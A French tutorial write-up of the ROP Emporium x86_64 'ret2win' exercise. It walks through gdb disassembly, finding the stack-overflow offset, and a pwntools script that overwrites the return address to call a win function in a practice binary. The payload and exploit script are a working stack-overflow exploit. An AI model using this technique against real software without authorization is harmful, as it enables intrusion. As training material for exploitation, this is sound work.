---
Title: Ropemporium x86_64 ret2win
Date: 2023-06-01
Tags: [linux, python, ROP, x86_64, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
---

# ret2win

## Introduction

Ce premier exercice jette les bases de l'exploitation d'un débordement de pile avec une pile non exécutable.
L'exploitation la plus simple consiste à appeler une fonction existante.

Dans ce premier exercice la fonction présente dans le code et ne demande pas de paramètre.

On va décrire la démarche d'évaluation de la taille du débordement qui sera considérée comme acquise dans les autres exercices.

## Découverte

Lancement du programme :

```sh
01_ret2win$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
Erreur de segmentation
```
Le programme nous indique gentiment qu'on a un débordement de pile après 32 caractères.

### Protections

On peut observer les protections posées sur l'exécutable avec la commande checksec de pwntools.

```sh
01_ret2win# checksec ret2win
[*] '/w/ropemporium/x64/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- NX : La pile n'est pas exécutable.
C'est ce qui rend la démarche de ROP nécessaire sinon on poserait un shellcode
- Stack : Pas de canary pour protéger le débordement.
Permet de simplifier les exercices.
- PIE : Position Independent Executable invalidé. Le code est chargé à adresse fixe.
Permet de simplifier les exercices.
- RELRO : La table GOT de résolution des adresses de fonctions importées est inscriptible.
La résolution des adresses est différée au premier usage de la fonction.

### Observation du programme avec gdb

List the avalables functions:

```
info fun
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```

La fonction principale :

``` sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret
End of assembler dump.
```

La fonction pwnme :

```sh
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave
   0x0000000000400755 <+109>:	ret
End of assembler dump.
```

C'est la fonction qui lit le message et est vulnérable à un débordement?

Enfin on a une fonction ret2win qui n'est pas appelée mais permet d'afficher le flag.
```sh
gef➤  disas ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943 ; "cat flag.txt"
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret
End of assembler dump.
```

## Evaluation de l'offset de débordement

### Méthode statique

La séquence de lecture du message
read(0, bufferr, taille)

``` sh
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
```

Lit un message de 0x38 (56) caractères a destination de l'adresse rbp-0x20.
On a donc 0x20 (32) octets avant d'atteindre la fin de la pile et la sauvegarde de RBP effecuée dans le prélude :

``` sh
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
```
Et donc après 0x28 (40) octes on récrase l'adresse de retour.

On peut l'observer en positionnant un point d'arrêt dans gdb sur le read :

```
gef➤  b *pwnme+92
```

On peut observer la pile juste avant le read :


``` sh
read@plt (
   $rdi = 0x00000000000000,
   $rsi = 0x007ffc6bebe550 → 0x0000000000000000,
   $rdx = 0x00000000000038
)
```

La pile avant le read :

``` sh
0x007ffcba437b30│+0x0000: 0x0000000000000000	 ← $rax, $rsp, $rsi
0x007ffcba437b38│+0x0008: 0x0000000000000000
0x007ffcba437b40│+0x0010: 0x0000000000000000
0x007ffcba437b48│+0x0018: 0x0000000000000000
0x007ffcba437b50│+0x0020: 0x007ffcba437b60  →  0x0000000000000001	 ← $rbp
0x007ffcba437b58│+0x0028: 0x000000004006d7  →  <main+64> mov edi, 0x400828
0x007ffcba437b60│+0x0030: 0x0000000000000001
0x007ffcba437b68│+0x0038: 0x007fd46b63a18a  →  <__libc_start_call_main+122>
```
La pile apres le read d'un massage de 48 caractères :
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFF

``` sh
0x007ffcba437b30│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x007ffcba437b38│+0x0008: 0x4242424242424242
0x007ffcba437b40│+0x0010: 0x4343434343434343
0x007ffcba437b48│+0x0018: 0x4444444444444444
0x007ffcba437b50│+0x0020: 0x4545454545454545	 ← $rbp
0x007ffcba437b58│+0x0028: 0x0a46464646464646     ← adresse de retour
0x007ffcba437b60│+0x0030: 0x0000000000000001
0x007ffcba437b68│+0x0038: 0x007fd46b63a18a  →  <__libc_start_call_main+122>
```

### cyclic codes usage

Traditionnelement, l'offet d'un débordement peut être évalué avec un message  cyclique.

Sous gdb avec GEF :

``` sh
gef➤  r
Starting program: /home/jce/w/ropemporium/x64/01_ret2win/ret2win
[*] Failed to find objfile or not a valid file format: [Errno 2] Aucun fichier ou dossier de ce type: 'system-supplied DSO at 0x7ffff7fd0000'
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
Thank you!
Program received signal SIGSEGV, Segmentation fault.
```

Au plantage les registes contiennent :
``` sh
$rax   : 0xb
$rbx   : 0x0
$rcx   : 0x007ffff7eca473  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x007fffffffe158  →  0x6161616161616166 ("faaaaaaa"?)
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
```

En pariculier RSP contient 0x6161616161616166

``` sh
gef➤  pattern search $rsp
[+] Searching for '$rsp'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search)
```

### Automatisation python

``` Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:

from pwn import *
import os

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win')
io = process([elf.path])
# Envoi d'un code cyclique de taille 80
io.sendline(cyclic(0x50))
io.wait()

# identification d'un fichier core
core = io.corefile
# Recuperation de la valeur contenue dans RSP au moment du plantage
rsp = core.rsp
pattern = core.read(rsp, 4)
# Identification de l'offsec correspondant dans le code
offset = cyclic_find(pattern)
info(f"pattern     = {pattern.decode()}")
info(f"offset srip = 0x{offset:x}")

os.remove(core.path)
```


## Exploitation

Si on envoie un message constitué de 40 caractère de débordement puis l'adresse de ret2win :

On peut realiser cela ainsi sous gdb, en affichant le payload avec printf dans ce cas simple.

On va envoyer :

- 40 caractères pour le débordement ( printf "%40s" A)
- L'adresse de la cible avec les valeurs dans l'ordre de convention intel : octets de poind faible en premier (little endian)
\x56\x07\x40\x00\x00\x00\x00\x00

Ne pas mettre les zéros à la fin fonctionne parce qu'il y en a déjà du fait qu'on écrase une adresse de même forme.
En revanche si, comme ce sera le cas dans les exercices suivant on doit ajouter des éléments dans la chaîne, les zéros devont être explicites.

```sh
gef➤  r < <(printf "%40s\x56\x07\x40\x00\x00\x00\x00\x00" A)
Starting program: /home/jce/w/ropemporium/x64/01_ret2win/ret2win < <(printf "%40s\x56\x07\x40" A)
[*] Failed to find objfile or not a valid file format: [Errno 2] Aucun fichier ou dossier de ce type: 'system-supplied DSO at 0x7ffff7fd0000'
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
[Detaching after vfork from child process 18695]
ROPE{a_placeholder_32byte_flag!}
```

### En python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win')

target = elf.symbols["ret2win"]

gs='''
b *pwnme+107
c
'''

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

time.sleep(.5)


io.recvuntil(b"> ")

# for stack alignement in case of movabs usage
ropnop=0x400770

PL=0x28*b"A"+p64(ropnop)+p64(target)
io.sendline(PL)
io.interactive()
```

### Exécution

```sh
jce@zbook310152:~/w/ropemporium/x64/01_ret2win$ python3 solve.py
[*] '/home/jce/w/ropemporium/x64/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/jce/w/ropemporium/x64/01_ret2win/ret2win': pid 6953
[*] Switching to interactive mode
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/jce/w/ropemporium/x64/01_ret2win/ret2win' stopped with exit code 0 (pid 6953)
[*] Got EOF while reading in interactive
```

